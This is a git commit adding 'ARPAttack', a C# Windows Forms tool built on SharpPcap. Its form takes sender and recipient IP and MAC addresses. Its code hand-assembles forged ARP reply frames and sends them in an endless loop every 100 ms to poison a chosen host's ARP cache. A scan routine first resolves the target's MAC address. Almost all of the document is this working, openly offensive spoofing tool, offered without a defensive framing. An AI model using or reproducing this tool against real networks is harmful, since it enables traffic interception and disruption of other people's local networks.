fcb6ce3aa1afbf8cd720fbf52efc7b1c42da324e
week233 <872285171@qq.com>
2018-08-21 22:11:07 +0800

    V0.0.1

---
+++ ARPAttack/Form1.Designer.cs
@@ -0,0 +1,216 @@
+﻿namespace ARPAttack
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 必需的设计器变量。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清理所有正在使用的资源。
+        /// </summary>
+        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows 窗体设计器生成的代码
+
+        /// <summary>
+        /// 设计器支持所需的方法 - 不要修改
+        /// 使用代码编辑器修改此方法的内容。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.combDevice = new System.Windows.Forms.ComboBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.btnScan = new System.Windows.Forms.Button();
+            this.label6 = new System.Windows.Forms.Label();
+            this.btnStart = new System.Windows.Forms.Button();
+            this.txtRecipientMAC = new System.Windows.Forms.TextBox();
+            this.txtRecipientIP = new System.Windows.Forms.TextBox();
+            this.txtSenderMAC = new System.Windows.Forms.TextBox();
+            this.txtSenderIP = new System.Windows.Forms.TextBox();
+            this.label5 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.groupBox1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // combDevice
+            // 
+            this.combDevice.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
+            this.combDevice.FormattingEnabled = true;
+            this.combDevice.Location = new System.Drawing.Point(59, 17);
+            this.combDevice.Name = "combDevice";
+            this.combDevice.Size = new System.Drawing.Size(729, 20);
+            this.combDevice.TabIndex = 0;
+            this.combDevice.SelectedIndexChanged += new System.EventHandler(this.combDevice_SelectedIndexChanged);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(12, 20);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(41, 12);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "Device";
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.Controls.Add(this.btnScan);
+            this.groupBox1.Controls.Add(this.label6);
+            this.groupBox1.Controls.Add(this.btnStart);
+            this.groupBox1.Controls.Add(this.txtRecipientMAC);
+            this.groupBox1.Controls.Add(this.txtRecipientIP);
+            this.groupBox1.Controls.Add(this.txtSenderMAC);
+            this.groupBox1.Controls.Add(this.txtSenderIP);
+            this.groupBox1.Controls.Add(this.label5);
+            this.groupBox1.Controls.Add(this.label4);
+            this.groupBox1.Controls.Add(this.label3);
+            this.groupBox1.Controls.Add(this.label2);
+            this.groupBox1.Location = new System.Drawing.Point(13, 59);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(775, 379);
+            this.groupBox1.TabIndex = 2;
+            this.groupBox1.TabStop = false;
+            this.groupBox1.Text = "ARPAttack";
+            // 
+            // btnScan
+            // 
+            this.btnScan.Location = new System.Drawing.Point(8, 215);
+            this.btnScan.Name = "btnScan";
+            this.btnScan.Size = new System.Drawing.Size(75, 23);
+            this.btnScan.TabIndex = 10;
+            this.btnScan.Text = "Scan";
+            this.btnScan.UseVisualStyleBackColor = true;
+            this.btnScan.Click += new System.EventHandler(this.btnScan_Click);
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Location = new System.Drawing.Point(105, 259);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(65, 12);
+            this.label6.TabIndex = 9;
+            this.label6.Text = "the 0 time";
+            // 
+            // btnStart
+            // 
+            this.btnStart.Location = new System.Drawing.Point(8, 259);
+            this.btnStart.Name = "btnStart";
+            this.btnStart.Size = new System.Drawing.Size(75, 23);
+            this.btnStart.TabIndex = 8;
+            this.btnStart.Text = "Start";
+            this.btnStart.UseVisualStyleBackColor = true;
+            this.btnStart.Click += new System.EventHandler(this.btnStart_Click);
+            // 
+            // txtRecipientMAC
+            // 
+            this.txtRecipientMAC.Location = new System.Drawing.Point(107, 160);
+            this.txtRecipientMAC.Name = "txtRecipientMAC";
+            this.txtRecipientMAC.Size = new System.Drawing.Size(164, 21);
+            this.txtRecipientMAC.TabIndex = 7;
+            // 
+            // txtRecipientIP
+            // 
+            this.txtRecipientIP.Location = new System.Drawing.Point(107, 117);
+            this.txtRecipientIP.Name = "txtRecipientIP";
+            this.txtRecipientIP.Size = new System.Drawing.Size(164, 21);
+            this.txtRecipientIP.TabIndex = 6;
+            // 
+            // txtSenderMAC
+            // 
+            this.txtSenderMAC.Location = new System.Drawing.Point(107, 76);
+            this.txtSenderMAC.Name = "txtSenderMAC";
+            this.txtSenderMAC.Size = new System.Drawing.Size(164, 21);
+            this.txtSenderMAC.TabIndex = 5;
+            // 
+            // txtSenderIP
+            // 
+            this.txtSenderIP.Location = new System.Drawing.Point(107, 36);
+            this.txtSenderIP.Name = "txtSenderIP";
+            this.txtSenderIP.Size = new System.Drawing.Size(164, 21);
+            this.txtSenderIP.TabIndex = 4;
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Location = new System.Drawing.Point(6, 163);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(83, 12);
+            this.label5.TabIndex = 3;
+            this.label5.Text = "Recipient MAC";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Location = new System.Drawing.Point(6, 120);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(77, 12);
+            this.label4.TabIndex = 2;
+            this.label4.Text = "Recipient IP";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(6, 79);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(65, 12);
+            this.label3.TabIndex = 1;
+            this.label3.Text = "Sender MAC";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(6, 39);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(59, 12);
+            this.label2.TabIndex = 0;
+            this.label2.Text = "Sender IP";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(800, 450);
+            this.Controls.Add(this.groupBox1);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.combDevice);
+            this.Name = "Form1";
+            this.Text = "ARPAttack by H2O";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox1.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.ComboBox combDevice;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.TextBox txtRecipientMAC;
+        private System.Windows.Forms.TextBox txtRecipientIP;
+        private System.Windows.Forms.TextBox txtSenderMAC;
+        private System.Windows.Forms.TextBox txtSenderIP;
+        private System.Windows.Forms.Button btnStart;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.Button btnScan;
+    }
+}
+
---
+++ ARPAttack/Form1.cs
@@ -0,0 +1,368 @@
+﻿using PacketDotNet;
+using SharpPcap;
+using SharpPcap.LibPcap;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace ARPAttack
+{
+    public partial class Form1 : Form
+    {
+        LibPcapLiveDeviceList devicesList;
+
+        /// <summary>
+        /// 发送的数据包
+        /// </summary>
+        private byte[] packet;
+
+        /// <summary>
+        /// 发送线程
+        /// </summary>
+        Thread t;
+
+        /// <summary>
+        /// 扫描线程
+        /// </summary>
+        Thread scanThread = null;
+
+        /// <summary>
+        /// 发送网卡
+        /// </summary>
+        LibPcapLiveDevice device;
+
+        /// <summary>
+        /// 发送次数
+        /// </summary>
+        int time = 0;
+
+        /// <summary>
+        /// 应答超时限制
+        /// </summary>
+        TimeSpan timeout = new TimeSpan(0, 0, 1);
+
+        byte[] mIP;
+        byte[] sIP;
+        byte[] mMAC;
+        byte[] sMAC;
+
+        public Form1()
+        {
+            InitializeComponent();
+            CheckForIllegalCrossThreadCalls = false;
+        }
+
+        /// <summary>
+        /// 初始化获取网卡列表
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            devicesList = LibPcapLiveDeviceList.Instance;   //获取本机所有网卡
+
+            if (devicesList.Count < 1)
+            {
+                throw new Exception("没有发现本机上的网络设备");
+            }
+
+            device = devicesList[0];
+
+            combDevice.DataSource = devicesList;
+        }
+
+        private void btnStart_Click(object sender, EventArgs e)
+        {
+            //信息检查
+            if (txtSenderIP.Text.Equals("") || txtSenderMAC.Text.Equals("") || txtRecipientIP.Text.Equals("")) {
+                MessageBox.Show("IP或MAC信息不完整");
+                return;
+            }
+
+            mIP = IPTOBYTE(txtRecipientIP.Text);
+            sIP = IPTOBYTE(txtSenderIP.Text);
+            sMAC = MACTOBYTE(txtSenderMAC.Text);
+            mMAC = MACTOBYTE(txtRecipientMAC.Text);
+
+            if (btnStart.Text.Equals("Start"))
+            {
+                //Time = 0;
+                t = new Thread(new ThreadStart(sendPack));
+                t.Start();
+                btnStart.Text = "Stop";
+            }else
+            {
+                device.Close();
+                t.Abort();
+                btnStart.Text = "Start";
+            }
+        }
+
+        /// <summary>
+        /// 获取请求数据包
+        /// </summary>
+        /// <returns></returns>
+        public byte[] getSenderPacket(byte[] yIP, byte[] mIP, byte[] yMAC)
+        {
+            //ARP请求数据包
+            byte[] packet = new byte[] {
+                //以太网首部
+                0xff, 0xff, 0xff, 0xff, 0xff, 0xff,//目标主机MAC地址      0
+                0x00, 0x23, 0xcd, 0x34, 0x20, 0x0e,//源主机MAC地址         6
+                0x08, 0x06,//帧类型（上层协议类型）ARP请求或应答          12
+                
+                //ARP帧
+                0x00, 0x01,//硬件类型 1表示以太网                         14
+                0x08, 0x00,//协议类型 0800表示IP地址                      16
+                0x06,//发送端以太网地址长度 6                             18
+                0x04,//发送端IP地址长度 4                                 19
+                0x00, 0x01,//OP 01请求 02应答                             20
+                0x00, 0x23, 0xcd, 0x34, 0x20, 0x0e, //发送端硬件地址      22
+                0xc0, 0xa8, 0x01, 0x01, 0xe0, 0xcb, //发送端协议（IP）地址28
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,//目的端硬件地址       34
+                0x01, 0x63, 0x00, 0x00, 0x00, 0x00,//目的端协议（IP）地址 40
+
+                //剩余18位填充字节没有意义。
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x5d, 0x27, 0xa1, 0xb5 };
+
+            //循环替换IP
+            for (int i = 0; i < 4; i++)
+            {
+                packet[i + 28] = yIP[i];
+
+
+                packet[i + 40] = mIP[i];
+            }
+
+            //循环替换MAC
+            for (int i = 0; i < 6; i++)
+            {
+                packet[i + 6] = yMAC[i];
+                packet[i + 22] = yMAC[i];
+            }
+
+            return packet;
+        }
+
+        /// <summary>
+        /// 获取响应数据包
+        /// </summary>
+        /// <returns></returns>
+        public byte[] getPacket(byte[] yIP, byte[] mIP, byte[] yMAC, byte[] mMAC)
+        {
+            //ARP应答数据包
+            byte[] packet = new byte[] {
+                //以太网首部
+                0xe0, 0xcb, 0x4e, 0x2f, 0x8a, 0xc7,//目标主机MAC地址      0
+                0x00, 0x23, 0xcd, 0x34, 0x20,0x0e,//源主机MAC地址         6
+                0x08, 0x06,//帧类型（上层协议类型）ARP请求或应答          12
+                
+                //ARP帧
+                0x00, 0x01,//硬件类型 1表示以太网                         14
+                0x08, 0x00,//协议类型 0800表示IP地址                      16
+                0x06,//发送端以太网地址长度 6                             18
+                0x04,//发送端IP地址长度 4                                 19
+                0x00, 0x02,//OP 01请求 02应答                             20
+                0x00, 0x23, 0xcd, 0x34, 0x20, 0x0e, //发送端硬件地址      22
+                0xc0, 0xa8, 0x01, 0x01, 0xe0, 0xcb, //发送端协议（IP）地址28
+                0x4e, 0x2f, 0x8a, 0xc7, 0xc0, 0xa8,//目的端硬件地址       34
+                0x01, 0x63, 0x00, 0x00, 0x00, 0x00,//目的端协议（IP）地址 40
+
+                //剩余18位填充字节没有意义。
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x5d, 0x27, 0xa1, 0xb5 };
+
+            //循环替换IP
+            for (int i = 0; i < 4; i++)
+            {
+                packet[i + 28] = yIP[i];
+
+
+                packet[i + 40] = mIP[i];
+            }
+
+            //循环替换MAC
+            for (int i = 0; i < 6; i++)
+            {
+                packet[i] = mMAC[i];
+                packet[i + 6] = yMAC[i];
+                packet[i + 22] = yMAC[i];
+                packet[i + 34] = mMAC[i];
+            }
+
+            return packet;
+        }
+
+        /// <summary>
+        /// IP转换成
+        /// </summary>
+        /// <returns></returns>
+        private byte[] IPTOBYTE(string ipstr)
+        {
+            IPAddress ip;
+            bool b = IPAddress.TryParse(ipstr, out ip);
+
+            return ip.GetAddressBytes();
+        }
+
+        /// <summary>
+        /// OP转Byte[]
+        /// </summary>
+        /// <param name="i">操作类型 1请求，2应答</param>
+        /// <returns></returns>
+        byte[] OPtoByte(int i) {
+            if (i == 1)
+                return new byte[] { 0x00, 0x02 };
+            else
+                return new byte[] { 0x00, 0x01 };
+        }
+
+        /// <summary>
+        /// 将MAC地址转换成byte[]
+        /// </summary>
+        /// <returns></returns>
+        private byte[] MACTOBYTE(string macStr)
+        {
+            string[] macList = macStr.Split('-');
+
+            byte[] macBytes = new byte[6];
+            for (int i = 0; i < 6; i++)
+            {
+                macBytes[i] = (byte)Convert.ToInt32(macList[i], 16);
+            }
+            return macBytes;
+
+        }
+
+        /// <summary>
+        /// 构造请求包
+        /// </summary>
+        /// <param name="destinationIP">目标主机IP</param>
+        /// <param name="localMac">本机MAC</param>
+        /// <param name="localIP">本机IP</param>
+        /// <returns></returns>
+        private Packet BuildRequest(IPAddress destinationIP, PhysicalAddress localMac, IPAddress localIP)
+        {
+            // an arp packet is inside of an ethernet packet
+            var ethernetPacket = new EthernetPacket(localMac,
+                                                    PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
+                                                    PacketDotNet.EthernetPacketType.Arp);
+            var arpPacket = new ARPPacket(PacketDotNet.ARPOperation.Request,
+                                          PhysicalAddress.Parse("00-00-00-00-00-00"),
+                                          destinationIP,
+                                          localMac,
+                                          localIP);
+
+            // the arp packet is the payload of the ethernet packet
+            ethernetPacket.PayloadPacket = arpPacket;
+
+            return ethernetPacket;
+        }
+
+        /// <summary>
+        /// 扫描以获取本地局域网的IP和Mac地址映射
+        /// </summary>
+        public void ScanLAN()
+        {
+            // 构造Arp请求包,挨个轮询ip
+            var arpPackets = BuildRequest(IPAddress.Parse(txtRecipientIP.Text), PhysicalAddress.Parse(txtSenderMAC.Text), IPAddress.Parse(txtSenderIP.Text));
+
+            //创建一个“tcpdump”过滤器，只允许读取arp回复
+            String arpFilter = "arp and ether dst " + txtSenderMAC.Text;
+
+            //open the device with 20ms timeout
+            device.Open(DeviceMode.Promiscuous, 20);
+
+            //set the filter
+            device.Filter = arpFilter;
+
+            scanThread = new System.Threading.Thread(() =>
+            {
+                var lastRequestTime = DateTime.FromBinary(0);
+                var requestInterval = new TimeSpan(0, 0, 1);
+                var timeoutDateTime = DateTime.Now + timeout;
+                while (DateTime.Now < timeoutDateTime)
+                {
+                    if (requestInterval < (DateTime.Now - lastRequestTime))
+                    {
+                        // inject the packet to the wire
+                        device.SendPacket(arpPackets);
+                        lastRequestTime = DateTime.Now;
+                    }
+
+                    //read the next packet from the network
+                    var reply = device.GetNextPacket();
+                    if (reply == null)
+                    {
+                        continue;
+                    }
+
+                    // parse the packet
+                    var packet = PacketDotNet.Packet.ParsePacket(reply.LinkLayerType, reply.Data);
+
+                    // is this an arp packet?
+                    var arpPacket = PacketDotNet.ARPPacket.GetEncapsulated(packet);
+                    if (arpPacket == null)
+                    {
+                        continue;
+                    }
+
+                    //if this is the reply we're looking for, stop
+                    if (arpPacket.SenderProtocolAddress.Equals(txtSenderIP.Text))
+                    {
+                        txtRecipientMAC.Text = arpPacket.SenderHardwareAddress.ToString();
+                        break;
+                    }
+                }
+
+                device.Close();
+                Console.WriteLine("exit scan");
+            });
+            scanThread.Start();
+        }
+
+        /// <summary>
+        /// 发送数据
+        /// </summary>
+        public void sendPack()
+        {
+            device.Open();
+            var timeoutDateTime = DateTime.Now + timeout;
+
+            //构造ARP响应包
+            packet = getPacket(sIP, mIP, sMAC, mMAC);
+
+            while (true)
+            {
+                device.SendPacket(packet);
+                time++;
+                label6.Text = "the" + time + "time";
+                Thread.Sleep(100);
+            }
+
+        }
+
+        private void combDevice_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            // 获取相应的设备网关MAC，IP，本机MAC，IP
+            device = devicesList[(sender as ComboBox).SelectedIndex];
+        }
+
+        private void btnScan_Click(object sender, EventArgs e)
+        {
+            ScanLAN();
+        }
+    }
+}
